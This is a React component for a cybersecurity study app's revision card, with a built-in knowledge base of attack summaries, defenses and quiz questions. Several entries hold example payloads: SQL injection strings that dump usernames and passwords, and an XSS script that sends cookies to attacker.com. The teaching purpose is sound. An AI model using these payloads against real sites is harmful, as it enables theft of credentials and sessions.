import React, { useState } from "react";
import {
  X,
  Shield,
  RotateCcw,
  Sparkles,
  CheckCircle2,
  AlertTriangle,
  Code,
  Lock,
  ChevronRight,
  HelpCircle,
} from "lucide-react";
import { motion, AnimatePresence } from "motion/react";

interface RevisionModalProps {
  isOpen: boolean;
  topic: string;
  onClose: () => void;
  onRecordRetention: (topic: string, retentionChange: number) => Promise<void>;
}

interface TopicKnowledgeBase {
  summary: string;
  attackPattern: string;
  defense: string;
  quizQuestion: string;
  quizAnswer: string;
  severity: "Critical" | "High" | "Medium";
}

const KNOWLEDGE_BASE: Record<string, TopicKnowledgeBase> = {
  "SQL Injection": {
    summary: "Untrusted user inputs modify database query logic, allowing attackers to read, alter, or delete arbitrary data, or escalate database privileges.",
    attackPattern: `' OR 1=1 --\n' UNION SELECT username, password FROM users --\nadmin' #`,
    defense: "Always use parameterized queries (Prepared Statements) or an ORM. Avoid dynamic string concatenation in SQL queries.",
    quizQuestion: "What is the primary architectural defense against SQL Injection?",
    quizAnswer: "Parameterized queries / prepared statements with strict input validation.",
    severity: "Critical",
  },
  "Access Control": {
    summary: "Failure to enforce authorization permissions allows users to act outside their intended roles (e.g., IDOR, horizontal/vertical privilege escalation).",
    attackPattern: `GET /api/user/1002/invoice (when logged in as user 1001)\nPOST /api/admin/deleteUser with user session`,
    defense: "Enforce server-side authorization checks on EVERY request based on user session token, not client-supplied identifiers.",
    quizQuestion: "What is Insecure Direct Object Reference (IDOR)?",
    quizAnswer: "When an application provides direct access to objects based on user-supplied input without verifying authorization.",
    severity: "High",
  },
  "Cross-Site Scripting (XSS)": {
    summary: "Malicious scripts are injected into trusted web applications, executing in victim browsers to steal session cookies, tokens, or perform unauthorized actions.",
    attackPattern: `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n<img src=x onerror=alert(document.domain)>`,
    defense: "Context-aware output encoding (HTML, JS, URL), Content Security Policy (CSP), and HttpOnly cookie flags.",
    quizQuestion: "How does the 'HttpOnly' cookie flag protect against XSS?",
    quizAnswer: "It prevents client-side JavaScript (document.cookie) from accessing the cookie.",
    severity: "High",
  },
  "Burp Suite": {
    summary: "Industry-standard web vulnerability assessment proxy for intercepting, modifying, and fuzzing HTTP requests using Proxy, Repeater, and Intruder.",
    attackPattern: `Intercept Request -> Send to Repeater (Ctrl+R) -> Modify Headers / Payload -> Observe response codes & diffs`,
    defense: "Configure custom TLS certificates, define targeted target scopes, and use Match & Replace rules for automated token injection.",
    quizQuestion: "What is the primary difference between Burp Repeater and Intruder?",
    quizAnswer: "Repeater is for manual request crafting; Intruder is for automated fuzzing and payload spraying.",
    severity: "Medium",
  },
  "Buffer Overflow": {
    summary: "Writing data past allocated memory boundaries in low-level languages (C/C++), overwriting adjacent memory including return addresses (EIP/RIP).",
    attackPattern: `Cyclic pattern payload generation -> Calculate offset to EIP -> Inject NOP sled + shellcode -> Overwrite return address`,
    defense: "ASLR (Address Space Layout Randomization), DEP/NX (Data Execution Prevention), Stack Canaries, and using memory-safe languages.",
    quizQuestion: "What is the purpose of a Stack Canary?",
    quizAnswer: "A known value placed before the return address that triggers program termination if modified by an overflow.",
    severity: "Critical",
  },
};

const DEFAULT_KNOWLEDGE: TopicKnowledgeBase = {
  summary: "Comprehensive cybersecurity and software engineering topic. Focus on attack surface minimization, defense in depth, and proactive testing.",
  attackPattern: "Identify entry points -> Analyze request/response -> Test boundaries -> Exploit edge cases",
  defense: "Apply principle of least privilege, input sanitization, safe API usage, and continuous security testing.",
  quizQuestion: "What is the fundamental security principle applied here?",
  quizAnswer: "Defense in depth & principle of least privilege.",
  severity: "Medium",
};

export function RevisionModal({
  isOpen,
  topic,
  onClose,
  onRecordRetention,
}: RevisionModalProps) {
  const [showAnswer, setShowAnswer] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  if (!isOpen || !topic) return null;

  const data = KNOWLEDGE_BASE[topic] || DEFAULT_KNOWLEDGE;

  const handleScore = async (change: number) => {
    setSubmitting(true);
    try {
      await onRecordRetention(topic, change);
      onClose();
    } catch (e) {
      console.error("[RevisionModal] score error:", e);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-[150] flex items-center justify-center p-4">
      {/* Backdrop */}
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        onClick={onClose}
        className="absolute inset-0 bg-black/80 backdrop-blur-md"
      />

      {/* Modal Container */}
      <motion.div
        initial={{ scale: 0.95, opacity: 0, y: 15 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.95, opacity: 0, y: 15 }}
        className="relative z-10 w-full max-w-lg p-6 rounded-3xl bg-slate-900/95 border border-white/15 shadow-2xl backdrop-blur-2xl space-y-5 text-white"
      >
        {/* Header */}
        <div className="flex items-start justify-between">
          <div className="flex items-center gap-3">
            <div className="p-2.5 rounded-2xl bg-cyan-500/15 border border-cyan-400/30 text-cyan-300">
              <Shield className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono uppercase tracking-widest text-cyan-400 font-bold">
                  Spaced Revision Card
                </span>
                <span
                  className={`px-1.5 py-0.2 rounded text-[9px] font-mono font-bold uppercase border ${
                    data.severity === "Critical"
                      ? "bg-rose-500/20 text-rose-300 border-rose-500/30"
                      : "bg-amber-500/20 text-amber-300 border-amber-500/30"
                  }`}
                >
                  {data.severity}
                </span>
              </div>
              <h3 className="text-lg font-bold font-sans tracking-tight text-white mt-0.5">
                {topic}
              </h3>
            </div>
          </div>

          <button
            type="button"
            onClick={onClose}
            className="p-1.5 rounded-xl border border-white/10 text-slate-400 hover:text-white hover:bg-white/10 transition cursor-pointer"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Content Tabs / Cards */}
        <div className="space-y-3 text-xs">
          {/* 1. Core Summary */}
          <div className="p-3.5 rounded-2xl bg-black/40 border border-white/[0.06] space-y-1">
            <span className="text-[9px] font-mono uppercase tracking-wider text-slate-400 block font-semibold">
              Core Concept &amp; Vulnerability
            </span>
            <p className="text-slate-200 leading-relaxed font-sans">{data.summary}</p>
          </div>

          {/* 2. Attack Pattern */}
          <div className="p-3.5 rounded-2xl bg-rose-950/20 border border-rose-500/20 space-y-1">
            <span className="text-[9px] font-mono uppercase tracking-wider text-rose-400 block font-semibold flex items-center gap-1.5">
              <Code className="w-3 h-3" /> Exploitation Pattern / Payload
            </span>
            <pre className="text-[11px] font-mono text-rose-200/90 whitespace-pre-wrap bg-black/40 p-2 rounded-xl border border-rose-500/10">
              {data.attackPattern}
            </pre>
          </div>

          {/* 3. Defense & Mitigation */}
          <div className="p-3.5 rounded-2xl bg-emerald-950/20 border border-emerald-500/20 space-y-1">
            <span className="text-[9px] font-mono uppercase tracking-wider text-emerald-400 block font-semibold flex items-center gap-1.5">
              <Lock className="w-3 h-3" /> Mitigation &amp; Best Practices
            </span>
            <p className="text-emerald-200/90 leading-relaxed font-sans">{data.defense}</p>
          </div>

          {/* 4. Quick Self-Test Quiz */}
          <div className="p-3.5 rounded-2xl bg-indigo-950/30 border border-indigo-500/20 space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-[9px] font-mono uppercase tracking-wider text-indigo-300 font-semibold flex items-center gap-1.5">
                <HelpCircle className="w-3 h-3" /> Quick Knowledge Check
              </span>
              <button
                type="button"
                onClick={() => setShowAnswer(!showAnswer)}
                className="text-[10px] font-mono text-cyan-400 hover:underline cursor-pointer"
              >
                {showAnswer ? "Hide Answer" : "Reveal Answer"}
              </button>
            </div>
            <p className="text-slate-200 font-medium">{data.quizQuestion}</p>
            {showAnswer && (
              <motion.div
                initial={{ opacity: 0, y: 5 }}
                animate={{ opacity: 1, y: 0 }}
                className="p-2 rounded-xl bg-black/40 border border-indigo-500/30 text-indigo-200 font-mono text-[11px]"
              >
                {data.quizAnswer}
              </motion.div>
            )}
          </div>
        </div>

        {/* Action Rating Buttons */}
        <div className="pt-2 border-t border-white/[0.08] space-y-2">
          <span className="text-[10px] font-mono text-slate-400 uppercase block text-center">
            How well do you remember this topic?
          </span>
          <div className="grid grid-cols-3 gap-2">
            <button
              type="button"
              disabled={submitting}
              onClick={() => handleScore(-0.15)}
              className="py-2 px-3 rounded-xl border border-rose-500/30 bg-rose-500/10 hover:bg-rose-500/20 text-rose-300 text-xs font-mono font-semibold transition cursor-pointer disabled:opacity-50"
            >
              Needs Practice
            </button>
            <button
              type="button"
              disabled={submitting}
              onClick={() => handleScore(0.1)}
              className="py-2 px-3 rounded-xl border border-cyan-500/30 bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-300 text-xs font-mono font-semibold transition cursor-pointer disabled:opacity-50"
            >
              Good Review
            </button>
            <button
              type="button"
              disabled={submitting}
              onClick={() => handleScore(0.25)}
              className="py-2 px-3 rounded-xl border border-emerald-500/30 bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-300 text-xs font-mono font-semibold transition cursor-pointer disabled:opacity-50"
            >
              Mastered ✨
            </button>
          </div>
        </div>
      </motion.div>
    </div>
  );
}
